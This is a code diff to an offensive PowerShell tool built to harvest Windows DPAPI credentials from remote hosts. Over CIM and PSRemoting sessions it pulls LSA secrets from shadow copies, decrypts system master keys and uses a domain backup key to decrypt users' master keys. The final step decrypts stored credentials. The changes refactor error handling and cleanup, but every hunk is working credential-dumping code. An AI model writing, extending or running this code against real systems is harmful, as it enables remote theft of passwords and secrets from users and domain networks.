@@ -71,13 +71,30 @@ Function Get-CimDpapiCredential {
     )
 
     Begin {
-        if ($Ping -and -not $(Test-Connection -Count 1 -Quiet -ComputerName $ComputerName)) {
-            Write-Verbose "[$ComputerName] Host is unreachable."
-            break
+        # Check script parameters
+        if ($DomainOnly -and -not $BackupKeyFile) {
+            Write-Warning "Please specify backup key file or retry without switch '-DomainOnly'"
+            continue
         }
 
+        # Optionally check host reachability
+        if ($Ping -and -not $(Test-Connection -Count 1 -Quiet -ComputerName $ComputerName)) {
+            Write-Verbose "[$ComputerName] Host is unreachable."
+            continue
+        }
+
+        # Init variables
         $cimOption = New-CimSessionOption -Protocol $Protocol
         $psOption = New-PSSessionOption -NoMachineProfile
+        $outputDirectory = "$Env:TEMP\$ComputerName"
+        $formatDefaultLimit = $global:FormatEnumerationLimit
+    }
+
+    Process {
+        # Prevent output truncation
+        $global:FormatEnumerationLimit = -1
+
+        # Init remote sessions
         try {
             if (-not $PSBoundParameters['ComputerName']) {
                 $cimSession = New-CimSession -SessionOption $cimOption -ErrorAction Stop -Verbose:$false
@@ -100,39 +117,28 @@ Function Get-CimDpapiCredential {
         }
         catch [Management.Automation.PSArgumentOutOfRangeException] {
             Write-Warning "Alternative authentication method and/or protocol should be used with implicit credentials."
-            break
+            return
         }
         catch [Microsoft.Management.Infrastructure.CimException] {
             if ($Error[0].FullyQualifiedErrorId -eq 'HRESULT 0x8033810c,Microsoft.Management.Infrastructure.CimCmdlets.NewCimSessionCommand') {
                 Write-Warning "Alternative authentication method and/or protocol should be used with implicit credentials."
-                break
+                return
             }
             if ($Error[0].FullyQualifiedErrorId -eq 'HRESULT 0x80070005,Microsoft.Management.Infrastructure.CimCmdlets.NewCimSessionCommand') {
                 Write-Verbose "[$ComputerName] Access denied."
-                break
+                return
             }
             else {
                 Write-Verbose "[$ComputerName] Failed to establish CIM session."
-                break
+                return
             }
         }
         catch [Management.Automation.Remoting.PSRemotingTransportException] {
             Write-Verbose "[$ComputerName] Failed to establish PSRemoting session."
-            break
+            return
         }
 
-        if ($DomainOnly -and -not $BackupKeyFile) {
-            Write-Warning "Please specify backup key file or retry without switch '-DomainOnly'"
-            break
-        }
-
-        $formatDefaultLimit = $global:FormatEnumerationLimit
-        $global:FormatEnumerationLimit = -1 # Prevent output truncation
-
-        $outputDirectory = "$Env:TEMP\$ComputerName"
-    }
-
-    Process {
+        # Optionally process extraction of system master keys
         if (-not $DomainOnly) {
             Write-Verbose "[$ComputerName] Extracting system DPAPI keys from shadow copy..."
             if ($Credential.UserName) {
@@ -167,22 +173,28 @@ Function Get-CimDpapiCredential {
                     }
 
                     $masterKeyBytes = [IO.File]::ReadAllBytes($outputFile)
-                    if ($masterKeyFile.Name.Contains('\User\')) {
-                        # Decrypt system master key using dpapi_userkey
-                        if ($plaintextMasterKey = Decrypt-MasterKeyWithSha -MasterKeyBytes $masterKeyBytes -ShaBytes $dpapiKeyUser) {
-                            $masterKeys += $plaintextMasterKey
+                    try {
+                        if ($masterKeyFile.Name.Contains('\User\')) {
+                            # Decrypt system master key using dpapi_userkey
+                            if ($plaintextMasterKey = Decrypt-MasterKeyWithSha -MasterKeyBytes $masterKeyBytes -ShaBytes $dpapiKeyUser) {
+                                $masterKeys += $plaintextMasterKey
+                            }
+                        }
+                        else {
+                            # Decrypt system master key using dpapi_machinekey
+                            if ($plaintextMasterKey = Decrypt-MasterKeyWithSha -MasterKeyBytes $masterKeyBytes -ShaBytes $dpapiKeyMachine) {
+                                $masterKeys += $plaintextMasterKey
+                            }
                         }
                     }
-                    else {
-                        # Decrypt system master key using dpapi_machinekey
-                        if ($plaintextMasterKey = Decrypt-MasterKeyWithSha -MasterKeyBytes $masterKeyBytes -ShaBytes $dpapiKeyMachine) {
-                            $masterKeys += $plaintextMasterKey
-                        }
+                    catch {
+                        Write-Warning "[$ComputerName] System master key decryption failed. $_"
                     }
                 }
             }
         }
 
+        # Process extraction of domain user master keys
         if ($BackupKeyFile) {
             Write-Verbose "[$ComputerName] Extracting user master keys..."
             $backupKeyBytes = [IO.File]::ReadAllBytes($BackupKeyFile)
@@ -204,14 +216,20 @@ Function Get-CimDpapiCredential {
 
                         # Decrypt user master key using provided backup key
                         $masterKeyBytes = [IO.File]::ReadAllBytes($outputFile)
-                        if ($plaintextMasterKey = Decrypt-MasterKey -MasterKeyBytes $masterKeyBytes -BackupKeyBytes $backupKeyBytes) {
-                            $masterKeys += $plaintextMasterKey
+                        try {
+                            if ($plaintextMasterKey = Decrypt-MasterKey -MasterKeyBytes $masterKeyBytes -BackupKeyBytes $backupKeyBytes) {
+                                $masterKeys += $plaintextMasterKey
+                            }
+                        }
+                        catch {
+                            Write-Verbose "[$ComputerName] User master key decryption failed. $_"
                         }
                     }
                 }
             }
         }
 
+        # Process extraction of DPAPI credentials
         if ($masterKeys) {
             # Get credential files
             Write-Verbose "[$ComputerName] Extracting DPAPI credentials..."
@@ -258,11 +276,16 @@ Function Get-CimDpapiCredential {
     }
 
     End {
-        Remove-CimSession -CimSession $cimSession
+        # Delete local copies
+        Remove-Item -Recurse -Force -Path $outputDirectory -ErrorAction SilentlyContinue
+        # End remote sessions
+        if ($cimSession) {
+            Remove-CimSession -CimSession $cimSession
+        }
         if ($psSession) {
             Remove-PSSession -Session $psSession
         }
-        Remove-Item -Recurse -Force -Path $outputDirectory
+        # Restore output limit
         $global:FormatEnumerationLimit = $formatDefaultLimit
     }
 }
@@ -321,7 +344,7 @@ Function Get-ShadowLsaDpapiKey {
             Copy-Item -Path "$securityBackupPath" -Destination "$outputDirectory" -FromSession $psSession
 
             # Delete the shadow link
-            Get-CimInstance -ClassName CIM_LogicalFile -Filter "Name='$($tempDir -Replace '\\','\\')'" -CimSession $cimSession -Verbose:$false | Remove-CimInstance -Verbose:$false
+            Get-CimInstance -ClassName CIM_LogicalFile -Filter "Name='$($tempDir.Replace('\','\\'))'" -CimSession $cimSession -Verbose:$false | Remove-CimInstance -Verbose:$false
         }
         else {
             # Create a SafeFileHandle of the UNC path
@@ -376,8 +399,7 @@ Function Get-ShadowLsaDpapiKey {
 # Adapted from PowerView by @harmj0y and @mattifestation
 Function Local:Invoke-UserImpersonation {
     [OutputType([IntPtr])]
-    [CmdletBinding(DefaultParameterSetName = 'Credential')]
-    Param(
+    Param (
         [Parameter(Mandatory = $True, ParameterSetName = 'Credential')]
         [Management.Automation.PSCredential]
         [Management.Automation.CredentialAttribute()]
@@ -419,8 +441,7 @@ Function Local:Invoke-UserImpersonation {
 }
 
 Function Local:Invoke-RevertToSelf {
-    [CmdletBinding()]
-    Param(
+    Param (
         [ValidateNotNull()]
         [IntPtr]
         $TokenHandle
@@ -437,7 +458,6 @@ Function Local:Invoke-RevertToSelf {
 }
 
 Function Local:Get-CimDirectory {
-    [CmdletBinding()]
     Param (
         [ValidateNotNullorEmpty()]
         [String]
@@ -453,13 +473,10 @@ Function Local:Get-CimDirectory {
     )
 
     Begin {
-        if ($path -match '\\$') {
-            # Strip off a trailing slash
-            $path = $path -replace "\\$", ""
-        }
+        $path = $path.TrimEnd("\")
         $cimParams = @{
             ClassName  = "Win32_Directory"
-            Filter     = "Name='$($path.replace("\", "\\"))'"
+            Filter     = "Name='$($path.Replace("\", "\\"))'"
             CimSession = $CimSession
             Verbose    = $false
         }
@@ -487,7 +504,6 @@ Function Local:Get-CimDirectory {
 }
 
 Function Local:Get-RemoteFile {
-    [CmdletBinding()]
     Param (
         [Parameter(Mandatory = $True)]
         [String]
@@ -899,7 +915,11 @@ Function Local:Decrypt-DpapiCredential {
             # If this key is present, decrypt this blob
             if ($algHash -eq 32782 -or $algHash -eq 32772) {
                 # Convert hex string to byte array
-                $keyBytes = [byte[]] -split ($MasterKeys[$guidString].ToString() -replace '..', '0x$& ')
+                $masterKey = $MasterKeys[$guidString].ToString()
+                $keyBytes = New-Object -TypeName byte[] -ArgumentList ($masterKey.Length / 2)
+                for ($i = 0; $i -lt $masterKey.Length; $i += 2) {
+                    $keyBytes[$i / 2] = [Convert]::ToByte($masterKey.Substring($i, 2), 16)
+                }
                 # Derive the session key
                 $derivedKeyBytes = Get-DerivedKey $keyBytes $saltBytes $algHash
                 $finalKeyBytes = New-Object byte[] ($algCryptLen / 8)
